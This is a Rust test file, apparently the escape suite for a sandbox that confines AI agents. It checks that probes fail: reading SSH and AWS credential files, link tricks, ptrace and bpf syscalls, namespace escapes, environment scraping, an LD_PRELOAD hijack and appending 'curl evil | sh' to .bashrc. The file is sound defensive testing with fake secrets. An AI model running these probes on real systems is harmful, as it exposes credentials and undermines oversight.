//! The escape suite: every test tries to do something the threat model says
//! a sandboxed process must not be able to do, and asserts that it fails
//! closed. Tests are named after threat-model ids (`docs/threat-model.md`).
//!
//! Fixtures are benign: fake keys with obvious markers, and no network
//! destination other than loopback.
//!
//! On a host where no backend is available every test prints
//! `UNTESTED ON THIS HOST` instead of passing silently. Set
//! `AGENTKEEP_REQUIRE_SANDBOX=1` (as Linux CI does) to turn that into a
//! failure.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

#[cfg(unix)]
mod suite {
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    use std::path::{Path, PathBuf};
    use std::process::{Command, Output};
    use std::sync::OnceLock;

    const FAKE_SSH_KEY: &str = "-----BEGIN OPENSSH PRIVATE KEY-----\nFAKE_TEST_KEY_NOT_REAL_agentkeep_escape_suite\n-----END OPENSSH PRIVATE KEY-----\n";
    const FAKE_AWS: &str = "[default]\naws_access_key_id = AKIA_TEST_FAKE_NOT_REAL\naws_secret_access_key = FAKE_TEST_SECRET_agentkeep\n";
    const FAKE_ENV_SECRET: &str = "sk-test-fake-agentkeep-escape-suite";

    fn bin() -> &'static str {
        env!("CARGO_BIN_EXE_agentkeep")
    }

    /// A fake home with planted secrets and a project directory.
    pub struct Harness {
        pub _root: tempfile::TempDir,
        pub home: PathBuf,
        pub project: PathBuf,
    }

    impl Harness {
        fn new() -> Self {
            let root = tempfile::tempdir().unwrap();
            let home = root.path().join("home");
            let project = root.path().join("home/work/project");
            fs::create_dir_all(home.join(".ssh")).unwrap();
            fs::write(home.join(".ssh/id_ed25519"), FAKE_SSH_KEY).unwrap();
            fs::set_permissions(
                home.join(".ssh/id_ed25519"),
                fs::Permissions::from_mode(0o600),
            )
            .unwrap();
            fs::create_dir_all(home.join(".aws")).unwrap();
            fs::write(home.join(".aws/credentials"), FAKE_AWS).unwrap();
            fs::create_dir_all(home.join("other-project")).unwrap();
            fs::write(
                home.join("other-project/secret.txt"),
                "FAKE_OTHER_PROJECT_SECRET",
            )
            .unwrap();
            fs::write(home.join(".bashrc"), "# original\n").unwrap();
            fs::create_dir_all(&project).unwrap();
            fs::write(project.join("README.md"), "hello\n").unwrap();
            Command::new("git")
                .arg("init")
                .arg("-q")
                .current_dir(&project)
                .output()
                .ok();
            Self {
                _root: root,
                home,
                project,
            }
        }

        /// Run a shell snippet inside the sandbox. `extra_policy` is written
        /// to the project's agentkeep.toml (after `schema = 1`).
        pub fn run(&self, extra_policy: &str, script: &str) -> Output {
            if extra_policy.is_empty() {
                let _ = fs::remove_file(self.project.join("agentkeep.toml"));
            } else {
                fs::write(
                    self.project.join("agentkeep.toml"),
                    format!("schema = 1\n{extra_policy}"),
                )
                .unwrap();
            }
            Command::new(bin())
                .args(["--no-ask", "run", "--", "sh", "-c", script])
                .current_dir(&self.project)
                .env_clear()
                .env("HOME", &self.home)
                .env("PATH", std::env::var("PATH").unwrap_or_default())
                .env("USER", "escapetester")
                .env("FAKE_SECRET_TOKEN", FAKE_ENV_SECRET)
                .env("LD_PRELOAD", "/nonexistent/evil.so")
                .env("TERM", "dumb")
                .output()
                .expect("spawn agentkeep")
        }
    }

    fn out(o: &Output) -> String {
        format!(
            "{}{}",
            String::from_utf8_lossy(&o.stdout),
            String::from_utf8_lossy(&o.stderr)
        )
    }

    /// `Some(harness)` when the Linux backend works here, `None` otherwise.
    pub fn harness(id: &str) -> Option<Harness> {
        static AVAILABLE: OnceLock<Result<(), String>> = OnceLock::new();
        let status = AVAILABLE.get_or_init(|| {
            let o = Command::new(bin())
                .arg("doctor")
                .output()
                .expect("run agentkeep doctor");
            if o.status.success() {
                Ok(())
            } else {
                Err(String::from_utf8_lossy(&o.stdout).trim().to_string())
            }
        });
        match status {
            Ok(()) => Some(Harness::new()),
            Err(reason) => {
                let msg =
                    format!("UNTESTED ON THIS HOST [{id}]: no sandbox backend available: {reason}");
                println!("{msg}");
                eprintln!("{msg}");
                assert!(
                    std::env::var_os("AGENTKEEP_REQUIRE_SANDBOX").is_none(),
                    "AGENTKEEP_REQUIRE_SANDBOX is set but the sandbox is unavailable: {reason}"
                );
                None
            }
        }
    }

    fn has(tool: &str) -> bool {
        Command::new("sh")
            .args(["-c", &format!("command -v {tool}")])
            .output()
            .is_ok_and(|o| o.status.success())
    }

    /// Assert that a probe failed and leaked nothing.
    fn assert_blocked(o: &Output, forbidden: &[&str], ctx: &str) {
        let text = out(o);
        for f in forbidden {
            assert!(!text.contains(f), "{ctx}: leaked `{f}`:\n{text}");
        }
    }

    // ---- F: filesystem ------------------------------------------------

    #[test]
    fn f1_ssh_and_cloud_credentials_are_absent() {
        let Some(h) = harness("F1") else { return };
        let o = h.run(
            "",
            "cat ~/.ssh/id_ed25519; cat ~/.aws/credentials; ls -la ~/.ssh ~/.aws; echo rc=$?",
        );
        assert_blocked(
            &o,
            &["FAKE_TEST_KEY", "AKIA_TEST_FAKE", "FAKE_TEST_SECRET"],
            "F1",
        );
        assert!(out(&o).contains("No such file"), "{}", out(&o));
    }

    #[test]
    fn f2_other_directories_in_home_are_absent() {
        let Some(h) = harness("F2") else { return };
        let o = h.run("", "cat ~/other-project/secret.txt; ls ~");
        assert_blocked(&o, &["FAKE_OTHER_PROJECT_SECRET"], "F2");
        let listed = out(&o).lines().any(|l| l.trim() == "other-project");
        assert!(!listed, "other-project listed in home:\n{}", out(&o));
    }

    #[test]
    fn f3_symlink_and_hardlink_tricks_fail() {
        let Some(h) = harness("F3") else { return };
        // Symlink created on the host pointing at the secret.
        std::os::unix::fs::symlink(
            h.home.join(".ssh/id_ed25519"),
            h.project.join("link-to-key"),
        )
        .unwrap();
        let o = h.run(
            "",
            "cat ./link-to-key; ln -s ~/.aws/credentials ./link2 && cat ./link2; ln ~/.ssh/id_ed25519 ./hardlink; echo ln-rc=$?; cat ./hardlink",
        );
        assert_blocked(&o, &["FAKE_TEST_KEY", "AKIA_TEST_FAKE"], "F3");
        assert!(
            !h.project.join("hardlink").exists(),
            "hardlink must not be created"
        );
    }

    #[test]
    fn f4_host_processes_are_invisible() {
        let Some(h) = harness("F4") else { return };
        let supervisor_pid = std::process::id();
        let o = h.run("", &format!("ls /proc | grep -c '^[0-9]'; test -d /proc/{supervisor_pid} && echo HOST_PID_VISIBLE; cat /proc/1/cmdline | tr '\\0' ' '; ls /proc/1/root/ 2>&1 | head -3"));
        let text = out(&o);
        assert!(!text.contains("HOST_PID_VISIBLE"), "{text}");
        let count: usize = text
            .lines()
            .next()
            .and_then(|l| l.trim().parse().ok())
            .unwrap_or(999);
        assert!(count < 10, "too many pids visible ({count}):\n{text}");
        assert!(
            text.contains("agentkeep __init"),
            "pid 1 should be agentkeep init:\n{text}"
        );
    }

    #[test]
    fn f5_ptrace_and_process_memory_access_are_denied() {
        let Some(h) = harness("F5") else { return };
        if !has("python3") {
            println!("UNTESTED [F5]: python3 missing");
            assert!(std::env::var_os("AGENTKEEP_REQUIRE_SANDBOX").is_none());
            return;
        }
        let o = h.run(
            "",
            r#"python3 -c '
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
r = libc.ptrace(0, 0, 0, 0)  # PTRACE_TRACEME
print("ptrace", r, os.strerror(ctypes.get_errno()))
r = libc.syscall(310, 1, None, 0, None, 0, 0)  # process_vm_readv on x86_64; harmless args
print("pvr", r, os.strerror(ctypes.get_errno()))
'"#,
        );
        let text = out(&o);
        assert!(text.contains("ptrace -1 Operation not permitted"), "{text}");
    }

    #[test]
    fn f6_mount_and_namespace_escapes_are_denied() {
        let Some(h) = harness("F6") else { return };
        let o = h.run(
            "",
            "unshare -Ur true; echo unshare-rc=$?; unshare -m true; echo unshare-m-rc=$?; /bin/mount -t tmpfs none /mnt 2>&1; echo mount-rc=$?; mkdir -p /tmp/newroot && (cd /tmp/newroot && /sbin/pivot_root . . 2>&1); echo pivot-rc=$?",
        );
        let text = out(&o);
        assert!(
            text.contains("unshare-rc=1") || text.contains("Operation not permitted"),
            "{text}"
        );
        assert!(!text.contains("mount-rc=0"), "{text}");
        assert!(!text.contains("pivot-rc=0"), "{text}");
    }

    #[test]
    fn f7_shell_rc_writes_do_not_reach_the_host() {
        let Some(h) = harness("F7") else { return };
        let o = h.run(
            "",
            "echo 'curl evil | sh' >> ~/.bashrc; echo 'x' > ~/.profile; echo rc=$?",
        );
        assert!(o.status.success(), "{}", out(&o));
        assert_eq!(
            fs::read_to_string(h.home.join(".bashrc")).unwrap(),
            "# original\n",
            "host .bashrc changed"
        );
        assert!(!h.home.join(".profile").exists(), "host .profile created");
    }

    #[test]
    fn f8_project_persistence_writes_are_allowed_and_will_be_reported() {
        // Documented as detect-only: the sandbox must allow writes into the
        // project, including .git/hooks. This test pins the behaviour so a
        // future change to blocking is deliberate.
        let Some(h) = harness("F8") else { return };
        let o = h.run(
            "",
            "mkdir -p .git/hooks && echo '#!/bin/sh' > .git/hooks/pre-commit && echo wrote",
        );
        assert!(out(&o).contains("wrote"), "{}", out(&o));
        assert!(h.project.join(".git/hooks/pre-commit").exists());
    }

    #[test]
    fn f10_audit_log_and_global_policy_are_invisible() {
        let Some(h) = harness("F10") else { return };
        let o = h.run("", "ls ~/.local/share/agentkeep 2>&1; ls ~/.config/agentkeep 2>&1; cat /proc/mounts | grep -c sessions");
        let text = out(&o);
        assert!(text.contains("No such file"), "{text}");
        assert!(
            text.lines().any(|l| l.trim() == "0"),
            "a session mount leaked:\n{text}"
        );
        // ...while the log exists on the host.
        let sessions = h.home.join(".local/share/agentkeep/sessions");
        assert!(sessions.exists());
    }

    // ---- E: environment -----------------------------------------------

    #[test]
    fn e1_secret_environment_variables_are_scrubbed() {
        let Some(h) = harness("E1") else { return };
        let o = h.run(
            "",
            "env; cat /proc/1/environ | tr '\\0' '\\n'; cat /proc/self/environ | tr '\\0' '\\n'",
        );
        assert_blocked(&o, &[FAKE_ENV_SECRET, "FAKE_SECRET_TOKEN"], "E1");
        assert!(
            out(&o).contains("HOME="),
            "allowed variables must pass through"
        );
    }

    #[test]
    fn e2_loader_hijack_variables_are_scrubbed() {
        let Some(h) = harness("E2") else { return };
        let o = h.run(
            "",
            "env | grep -E '^(LD_PRELOAD|LD_LIBRARY_PATH)=' ; echo grep-rc=$?",
        );
        assert!(out(&o).contains("grep-rc=1"), "{}", out(&o));
    }

    // ---- N: network ---------------------------------------------------

    #[test]
    fn n3_n4_no_network_and_no_dns() {
        let Some(h) = harness("N3/N4") else { return };
        let o = h.run(
            "",
            "getent hosts example.com; echo dns-rc=$?; cat /proc/net/dev | tail -n +3 | awk '{print $1}'; cat /proc/net/route | wc -l",
        );
        let text = out(&o);
        assert!(text.contains("dns-rc=2"), "{text}");
        let ifaces: Vec<&str> = text.lines().filter(|l| l.ends_with(':')).collect();
        assert_eq!(ifaces, vec!["lo:"], "only loopback may exist:\n{text}");
        if has("python3") {
            let o = h.run("", "python3 -c 'import socket; s=socket.socket(); s.settimeout(2); s.connect((\"127.0.0.1\", 9)) if False else None; \ntry:\n s.connect((\"203.0.113.1\", 80)); print(\"CONNECTED\")\nexcept OSError as e: print(\"blocked\", e)'");
            assert!(!out(&o).contains("CONNECTED"), "{}", out(&o));
        }
    }

    // ---- C: commands and processes ------------------------------------

    #[test]
    fn c3_no_capabilities_and_no_new_privs() {
        let Some(h) = harness("C3") else { return };
        let o = h.run("", "grep -E '^(CapEff|CapPrm|CapBnd|CapAmb|NoNewPrivs):' /proc/self/status; id -u; sudo -n true 2>&1; echo sudo-rc=$?");
        let text = out(&o);
        for cap in [
            "CapEff:\t0000000000000000",
            "CapPrm:\t0000000000000000",
            "CapBnd:\t0000000000000000",
            "CapAmb:\t0000000000000000",
            "NoNewPrivs:\t1",
        ] {
            assert!(text.contains(cap), "missing `{cap}` in:\n{text}");
        }
        assert!(!text.contains("sudo-rc=0"), "{text}");
    }

    #[test]
    fn c4_resource_limits_are_applied() {
        let Some(h) = harness("C4") else { return };
        if !has("python3") {
            println!("UNTESTED [C4]: python3 missing");
            assert!(std::env::var_os("AGENTKEEP_REQUIRE_SANDBOX").is_none());
            return;
        }
        let o = h.run(
            "[limits]\nmemory = \"512M\"\npids = 64\n",
            "python3 -c 'import resource; print(\"nproc\", resource.getrlimit(resource.RLIMIT_NPROC)); print(\"as\", resource.getrlimit(resource.RLIMIT_AS))'; cat /sys/fs/cgroup/memory.max 2>/dev/null",
        );
        let text = out(&o);
        let cgroup = text.lines().any(|l| l.trim() == "536870912");
        assert!(text.contains("nproc (64, 64)"), "{text}");
        assert!(
            cgroup || text.contains("as (536870912, 536870912)"),
            "{text}"
        );
    }

    #[test]
    fn c5_seccomp_is_active_and_denies_kernel_attack_surface() {
        let Some(h) = harness("C5") else { return };
        let o = h.run("", "grep -E '^Seccomp:' /proc/self/status");
        assert!(out(&o).contains("Seccomp:\t2"), "{}", out(&o));
        if has("python3") {
            let o = h.run(
                "",
                r#"python3 -c '
import ctypes, os, platform
libc = ctypes.CDLL(None, use_errno=True)
nr = {"x86_64": 425, "aarch64": 425}[platform.machine()]  # io_uring_setup
r = libc.syscall(nr, 8, None); print("io_uring", r, os.strerror(ctypes.get_errno()))
nr = {"x86_64": 321, "aarch64": 280}[platform.machine()]  # bpf
r = libc.syscall(nr, 0, None, 0); print("bpf", r, os.strerror(ctypes.get_errno()))
'"#,
            );
            let text = out(&o);
            assert!(
                text.contains("io_uring -1 Operation not permitted"),
                "{text}"
            );
            assert!(text.contains("bpf -1 Operation not permitted"), "{text}");
        }
    }

    #[test]
    fn c1_c2_command_rules_are_enforced_through_shims() {
        let Some(h) = harness("C1/C2") else { return };
        let o = h.run(
            "",
            "git status >/dev/null && echo status-ok; git push origin main; echo push-rc=$?; sudo true; echo sudo-rc=$?; readlink /run/agentkeep/bin/git",
        );
        let text = out(&o);
        assert!(text.contains("status-ok"), "{text}");
        assert!(text.contains("push-rc=126"), "{text}");
        assert!(text.contains("sudo-rc=126"), "{text}");
        assert!(text.contains("../agentkeep"), "{text}");
    }

    // ---- S: agentkeep itself ------------------------------------------

    #[test]
    fn s1_project_policy_cannot_silently_unhide() {
        let Some(h) = harness("S1") else { return };
        // Without acknowledge: ignored, with a warning.
        let o = h.run(
            "[filesystem]\nread_only = [\"~/.ssh\"]\n[override]\nunhide = [\"~/.ssh\"]\n",
            "cat ~/.ssh/id_ed25519",
        );
        assert_blocked(&o, &["FAKE_TEST_KEY"], "S1 without acknowledge");
        assert!(out(&o).contains("acknowledge"), "{}", out(&o));
        // With acknowledge: allowed, but loudly.
        let o = h.run("[filesystem]\nread_only = [\"~/.ssh\"]\n[override]\nacknowledge = true\nunhide = [\"~/.ssh\"]\n", "cat ~/.ssh/id_ed25519");
        let text = out(&o);
        assert!(
            text.contains("FAKE_TEST_KEY"),
            "override should take effect:\n{text}"
        );
        assert!(text.contains("PROTECTION WEAKENED"), "{text}");
    }

    #[test]
    fn l1_audit_log_is_written_and_chain_verifies() {
        let Some(h) = harness("L-A1") else { return };
        let o = h.run("", "git push origin main; echo done");
        assert!(out(&o).contains("done"));
        let sessions = h.home.join(".local/share/agentkeep/sessions");
        let session = fs::read_dir(&sessions)
            .unwrap()
            .next()
            .unwrap()
            .unwrap()
            .path();
        let events = agentkeep_audit::verify(&session.join("events.jsonl")).unwrap();
        let kinds: Vec<&str> = events.iter().map(|e| e.kind.as_str()).collect();
        assert_eq!(kinds.first(), Some(&"session.start"));
        assert_eq!(kinds.last(), Some(&"session.end"));
        assert!(kinds.contains(&"exec"));
        assert!(kinds.contains(&"approval.request"));
        let start = &events[0].data;
        assert!(start["env_scrubbed_secrets"]
            .as_array()
            .unwrap()
            .iter()
            .any(|v| v == "FAKE_SECRET_TOKEN"));
        assert!(
            !serde_json::to_string(start)
                .unwrap()
                .contains(FAKE_ENV_SECRET),
            "secret value in log"
        );
    }

    // ---- positive controls --------------------------------------------

    #[test]
    fn positive_control_project_is_writable_and_tools_work() {
        let Some(h) = harness("control") else { return };
        let o = h.run("", "echo changed > README.md && ls /usr/bin | head -1 >/dev/null && git log --oneline -0 >/dev/null 2>&1; echo rc=$?; echo \"$HOME\" \"$USER\" \"$(pwd)\"");
        let text = out(&o);
        assert!(o.status.success(), "{text}");
        assert_eq!(
            fs::read_to_string(h.project.join("README.md")).unwrap(),
            "changed\n"
        );
        assert!(
            text.contains(&format!(
                "{} escapetester {}",
                h.home.display(),
                h.project.display()
            )),
            "{text}"
        );
    }

    #[test]
    fn positive_control_exit_codes_propagate() {
        let Some(h) = harness("control") else { return };
        let o = h.run("", "exit 42");
        assert_eq!(o.status.code(), Some(42), "{}", out(&o));
    }

    #[test]
    fn positive_control_wall_time_limit_kills_the_session() {
        let Some(h) = harness("C4 wall") else { return };
        let o = h.run("[limits]\nwall_time = \"2s\"\n", "sleep 30; echo SURVIVED");
        let text = out(&o);
        assert!(!text.contains("SURVIVED"), "{text}");
        assert_eq!(o.status.code(), Some(124), "{text}");
        let _ = Path::new("/");
    }
}

#[cfg(not(unix))]
#[test]
fn untested_on_this_host() {
    println!(
        "UNTESTED ON THIS HOST: the escape suite runs on Unix only; Windows uses WSL2 (Phase 2)"
    );
    assert!(std::env::var_os("AGENTKEEP_REQUIRE_SANDBOX").is_none());
}
